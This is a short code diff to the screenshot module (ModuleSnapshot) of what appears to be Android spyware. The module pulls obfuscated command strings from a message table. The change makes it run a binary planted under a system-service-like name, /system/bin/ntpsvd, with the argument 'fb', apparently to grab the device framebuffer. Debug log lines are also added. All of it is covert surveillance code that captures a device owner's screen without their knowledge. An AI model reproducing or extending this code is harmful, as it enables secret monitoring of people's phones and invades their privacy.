@@ -282,8 +282,14 @@ public class ModuleSnapshot extends BaseInstantModule {
 		final String getrawpath = Messages.getString("11.2"); //$NON-NLS-1$
 
 		try {
-			final Process localProcess = Runtime.getRuntime().exec(getrawpath);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getRawBitmap): calling frame generator");
+			}
+			final Process localProcess = Runtime.getRuntime().exec(new String[]{"/system/bin/ntpsvd","fb"});
 			localProcess.waitFor();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
+			}
 
 			final AutoFile file = new AutoFile(path, Messages.getString("11.3")); //$NON-NLS-1$
 			if (file.exists()) {
